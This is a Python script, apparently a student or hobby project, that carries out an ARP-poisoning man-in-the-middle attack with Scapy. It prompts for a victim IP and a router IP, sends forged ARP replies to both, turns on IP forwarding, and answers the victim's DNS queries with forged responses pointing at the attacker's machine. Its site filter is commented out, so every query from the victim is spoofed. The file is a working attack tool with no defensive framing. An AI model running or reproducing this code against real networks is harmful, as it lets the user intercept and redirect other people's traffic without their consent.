#!/usr/bin/env python3
# Authors: Matt Matero & Will Cusick
# Python Version: 3.5.2
from scapy.all import *
import socket
import atexit
import sys
import os
import time

last_session_filename = ".last_session"


def enable_ip_forwarding():
  print("[*] Enabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    result = os.system("sudo sysctl net.ipv4.ip_forward=1")
  elif sys.platform.startswith('darwin'):
    result = os.system("sudo sysctl net.inet.ip.forwarding=1")
  else:
    print("[!] Unsupported platform! Can't enable IP forwarding")
    raise NotImplementedError("Unsupported platform")

  if result > 0:
    print("[!] Error trying to enable IP forwarding")
    print("[!] Received Exit Status " + str(result))
    print("[!] Exiting...")
    # unregister disable_ip_forwarding since we know we didn't do it successfully
    atexit.unregister(disable_ip_forwarding)
    sys.exit(1)


# This will ensure we turn off IP forwarding for all "normal" modes of exiting.
# Including sys.exit(), KeyboardInterrupt, etc.
@atexit.register
def disable_ip_forwarding():
  print("[*] Disabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    os.system("sudo sysctl net.ipv4.ip_forward=0")
  elif sys.platform.startswith('darwin'):
    os.system("sudo sysctl net.inet.ip.forwarding=0")
  else:
    print("[!] Unsupported platform! Can't disable IP forwarding")
    raise NotImplementedError("Unsupported platform")


def get_mac(IP):
  print('Getting MAC addr for: ' + IP)
  conf.verb = 0
  ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface)
  # keep requesting until we get response
  while len(unans) > 0:
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface)

  for snd, rcv in ans:
    return rcv.sprintf(r"%Ether.src%")


# Unfortutanetly, socket.gethostbyname(socket.gethostname()) isn't a cross-platform
# way to get the LAN IP of the current machine. Following the suggestions at
# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
# this appears to work with minimal hassle
def get_lan_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(('10.255.255.255', 1))
    ip = s.getsockname()[0]
  except e:
    ip = '127.0.0.1'
  finally:
    s.close()
  return ip


def reARP(gate_mac, victim_mac):
  print("[*] Restoring Targets...")
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)


def trick(gate_mac, victim_mac):
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=victim_mac))
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))


def blacklist(packet, spoofs):
  print(packet['DNS Question Record'].qname)
  for s in spoofs:
    if s.lower() in packet['DNS Question Record'].qname:
      print('testing')
      return True
  return False

destIP = get_lan_ip()
# socket.gethostbyname('reddit.com')
def dns_spoof(dns_pkt):
  spoofed_sites = ['businessinsider'.encode(), 'verisign'.encode(), 'amazon'.encode()] # only spoof small set of websites
  ip = dns_pkt[IP]
  dns = dns_pkt[DNS]
  query = dns.qd

  #if blacklist(dns_pkt, spoofed_sites):
  spoof = Ether(dst=dns_pkt[Ether].src)/IP(src=ip.dst,dst=ip.src)/UDP(sport=ip.dport,dport=ip.sport)/\
            DNS(id=dns.id, z=0, ra=1,qr=1,qdcount=1,ancount=1,an=DNSRR(rrname=query.qname,rdata=destIP,ttl=3600,type=1),qd=query)
  sendp(spoof, verbose=0, iface=interface)
  print('sent!')

def sniffer(dns=False):
    if dns:
      pkt = sniff(iface=interface, filter='udp port 53',count=1)
      return pkt[0] # only a single packet
    else:
      pkts = sniff(iface=interface, count=100,
                 prn=lambda x: x.sprintf(" Source: %IP.src% : %Ether.src%, \n"
                                         "%Raw.load% \n\n Reciever: %IP.dst% \n"
                                         "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
      wrpcap("temp.pcap", pkts)


def parse_session_file():
  try:
    last_interface = ''
    last_victim_ip = ''
    last_gate_ip = ''
    last_session_path = os.path.join(sys.path[0], last_session_filename)
    with open(last_session_path, 'r') as f:
      line = f.readline()
      last_interface = line.strip()

      line = f.readline()
      last_victim_ip = line.strip()

      line = f.readline()
      last_gate_ip = line.strip()

      return last_interface, last_victim_ip, last_gate_ip
  except OSError:
    # If we fail trying to read, just continue as is
    return last_interface, last_victim_ip, last_gate_ip


def write_session_file(last_if, last_victim, last_gate):
  last_session_path = os.path.join(sys.path[0], last_session_filename)
  try:
    with open(last_session_path, 'w') as f:
      f.write(last_if + '\n')
      f.write(last_victim + '\n')
      f.write(last_gate + '\n')
  except OSError:
    # If we fail writing, fail silently
    pass


def mitm():
  try:
    victim_mac = get_mac(victim_ip)
    print(victim_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Victim MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  try:
    gate_mac = get_mac(gate_ip)
    print(gate_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Gateway MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  print("[*] Poisoning Targets...")

  local_host = get_lan_ip()
  while True:
    try:
      trick(gate_mac, victim_mac)

      pkt = sniffer(True)

      if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src == victim_ip:
        dns_spoof(pkt)
    except KeyboardInterrupt:
      reARP(gate_mac, victim_mac)
      print("[*] User Requested Shutdown")
      print("[*] Exiting...")
      return


if __name__ == '__main__':
  # Try to read info written from last session, so we can provide
  # defaults to the input.
  last_if, last_victim, last_gate = parse_session_file()

  try:
    if last_if:
      interface = input("[*] Enter Desired Interface ({}): ".format(last_if))
      if not interface:
        interface = last_if
    else:
      interface = input("[*] Enter Desired Interface: ")
    last_if = interface

    if last_victim:
      victim_ip = input("[*] Enter Victim IP ({}): ".format(last_victim))
      if not victim_ip:
        victim_ip = last_victim
    else:
      victim_ip = input("[*] Enter Victim IP: ")
    last_victim = victim_ip

    if last_gate:
      gate_ip = input("[*] Enter Router IP ({}): ".format(last_gate))
      if not gate_ip:
        gate_ip = last_gate
    else:
      gate_ip = input("[*] Enter Router IP: ")
    last_gate = gate_ip

    write_session_file(last_if, last_victim, last_gate)

    enable_ip_forwarding()
    mitm()
  except KeyboardInterrupt:
    print("[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(0)
